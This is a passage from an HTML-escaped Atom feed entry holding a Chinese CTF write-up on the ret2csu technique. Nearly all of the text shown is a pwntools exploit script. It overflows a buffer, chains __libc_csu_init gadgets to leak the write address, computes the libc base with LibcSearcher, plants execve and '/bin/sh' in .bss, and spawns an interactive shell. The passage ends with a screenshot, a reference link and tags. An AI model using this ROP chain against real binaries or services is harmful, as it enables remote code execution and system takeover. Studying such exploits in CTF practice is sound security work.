string&#34;&gt;&#34;read&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bss&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000400606&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0004005F0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;csu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#不能用 sendline，会出错&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write_really&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write_really&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;write_really&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;write&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;execve&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;execve&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;execve&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 &#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;参考链接 ret2csu：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==&#34;&gt;http://t.csdn.cn/DIqYv&lt;/span&gt;&lt;/p&gt;
-</content>
-        <category term="pwn" />
-        <category term="ret2csu" />
-        <category term="ctf" />
         <updated>2023-05-04T11:33:55.000Z</updated>
     </entry>
 </feed>
